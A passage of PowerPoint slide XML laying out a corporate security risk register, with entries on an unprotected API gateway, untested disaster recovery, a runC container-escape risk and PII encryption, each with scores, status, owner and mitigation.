                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>awareness</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85" name="TextBox 84"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8613648" y="4343400"/>
            <a:ext cx="3657599" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Monthly phishing simulations. Mandatory training on click.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="86" name="Rectangle 85"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4553712"/>
            <a:ext cx="1207007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92608" y="4590288"/>
            <a:ext cx="548640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>R-007</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="88" name="TextBox 87"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="4590288"/>
            <a:ext cx="2560320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>API gateway exposed to internet without WAF protection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89" name="TextBox 88"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3584448" y="4590288"/>
            <a:ext cx="1097280" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Network</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90" name="TextBox 89"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4773168" y="4590288"/>
            <a:ext cx="731520" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4/5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="91" name="TextBox 90"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5596128" y="4590288"/>
            <a:ext cx="566928" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3/5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92" name="TextBox 91"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6254496" y="4590288"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>12</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="93" name="TextBox 92"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6848856" y="4590288"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MITIGATED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="94" name="TextBox 93"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7808976" y="4590288"/>
            <a:ext cx="713232" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>infra-team</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="TextBox 94"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8613648" y="4590288"/>
            <a:ext cx="3657599" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cloudflare WAF deployed. Rate limiting active. Monthly review.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96" name="Rectangle 95"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4800600"/>
            <a:ext cx="1207007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92608" y="4837176"/>
            <a:ext cx="548640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>R-008</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="98" name="TextBox 97"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="4837176"/>
            <a:ext cx="2560320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>No verified DR/BCP test — RTO/RPO targets unvalidated</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="TextBox 98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3584448" y="4837176"/>
            <a:ext cx="1097280" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Continuity</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="100" name="TextBox 99"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4773168" y="4837176"/>
            <a:ext cx="731520" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2/5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="101" name="TextBox 100"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5596128" y="4837176"/>
            <a:ext cx="566928" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5/5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="102" name="TextBox 101"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6254496" y="4837176"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>10</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="103" name="TextBox 102"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6848856" y="4837176"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IN PROGRESS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="104" name="TextBox 103"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7808976" y="4837176"/>
            <a:ext cx="713232" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>infra-team</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="105" name="TextBox 104"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8613648" y="4837176"/>
            <a:ext cx="3657599" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Quarterly DR drills scheduled. RTO target 4h. First drill Mar 20.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="106" name="Rectangle 105"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5047488"/>
            <a:ext cx="1207007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92608" y="5084064"/>
            <a:ext cx="548640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>R-004</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="108" name="TextBox 107"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="5084064"/>
            <a:ext cx="2560320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Container escape via runC vuln on warehouse IoT gateway</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="109" name="TextBox 108"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3584448" y="5084064"/>
            <a:ext cx="1097280" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Container</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="110" name="TextBox 109"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4773168" y="5084064"/>
            <a:ext cx="731520" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2/5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="111" name="TextBox 110"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5596128" y="5084064"/>
            <a:ext cx="566928" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4/5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="112" name="TextBox 111"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6254496" y="5084064"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>8</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="113" name="TextBox 112"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6848856" y="5084064"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OPEN</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114" name="TextBox 113"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7808976" y="5084064"/>
            <a:ext cx="713232" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>devops</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="115" name="TextBox 114"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8613648" y="5084064"/>
            <a:ext cx="3657599" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Upgrade containerd. Seccomp profile applied. Audit in Q2.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="116" name="Rectangle 115"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5294376"/>
            <a:ext cx="1207007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92608" y="5330952"/>
            <a:ext cx="548640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>R-006</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="118" name="TextBox 117"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="5330952"/>
            <a:ext cx="2560320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Weak AES-128 encryption on shipment PII at rest</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="119" name="TextBox 118"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3584448" y="5330952"/>
            <a:ext cx="1097280" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Data</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="120" name="TextBox 119"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4773168" y="5330952"/>
            <a:ext cx="731520" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2/5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="121" name="TextBox 120"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5596128" y="5330952"/>
            <a:ext cx="566928" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3/5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="122" name="TextBox 121"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6254496" y="5330952"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>6</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="123" name="TextBox 122"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6848856" y="5330952"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
